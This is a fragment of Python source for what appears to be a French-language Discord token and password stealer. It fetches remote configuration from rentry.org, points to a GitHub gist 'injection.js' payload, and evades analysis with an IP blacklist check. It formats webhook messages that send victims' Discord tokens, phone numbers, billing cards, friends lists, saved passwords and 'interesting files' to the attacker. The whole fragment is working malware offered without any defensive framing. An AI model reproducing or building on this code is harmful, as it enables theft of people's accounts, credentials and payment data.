    ...
    while True:
        try:
            ...
            if ip in blacklisted:
                exit_program('IP Blacklist detecté')
            return
        except:
            pass
...
cname = "https://rentry.org/x9322/raw"
cnameresp = requests.get(cname)
cname = cnameresp.text

footerc = "https://rentry.org/pggqx/raw"
...
h00k = "webhook"
inj3c710n_url = f"https://gist.githubusercontent.com/7xEarly/d8f049469de63f63c07d4f5e86d08f80/raw/579c289aa953a535aeb0411e539a9bac8fe9daa9/injection.js"
DETECTED = False
...
def UP104D70K3N(token, path):
    ...
    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/1134137321994866699/1134138714013061180/Picsart_23-07-27_17-01-45-734.jpg"
    else:
    ...
    if friends == '': friends = "Pas d'amis UHQ trouvé"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = " -"

    data = {
        "content": f'{g108411NF0()} | Trouvé dans `{path}`',
        "embeds": [
            {
            "color": 2895667,
            "fields": [
                {
                    ...
                    "value": f"`{token}`\n[clique pour copié](https://superfurrycdn.nl/copy/{token})"
                },
                {
                ...
                {
                    "name": "<:phone:1095741029832990720> Numéro:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                ...
                {
                    "name": "<a:blackmoneycard:1095741026850852965> Cartes:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": "<:friends:1111401676511924448> Amies HQ:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            ...
            "footer": {
                "text": f"{footerc}",
                "icon_url": "https://cdn.discordapp.com/attachments/1134137321994866699/1134138714013061180/Picsart_23-07-27_17-01-45-734.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://cdn.discordapp.com/attachments/1134137321994866699/1134138714013061180/Picsart_23-07-27_17-01-45-734.jpg",
        "username": f"{cname}",
        "attachments": []
        }
...
def UP104D(name, link):
    ...
    if name == "cspassw":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": f"{cname} | Mot de passe {words}",
                    "description": f"**Trouvé**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Mot de passe Trouvé\n <:blackarrow:1095740975197995041> • [{cname}Passwords.txt]({link})",
                    "color": 2895667,
                    "footer": {
                        "text": f"{footerc}",
                        "icon_url": "https://cdn.discordapp.com/attachments/1134137321994866699/1134138714013061180/Picsart_23-07-27_17-01-45-734.jpg"
    ...
    if name == "kiwi":
        data = {
            ...
            "embeds": [
                ...
                "fields": [
                    {
                    "name": "Fichier intéressent trouvé:",
                    "value": link
                    }
                ],
                "author": {
                    "name": f"{cname} | Fichier {words}"
                },
                "footer": {
                    "text": f"{footerc}",
                    "icon_url": "https://cdn.discordapp.com/attachments/1134137321994866699/1134138714013061180/Picsart_23-07-27_17-01-45-734.jpg"
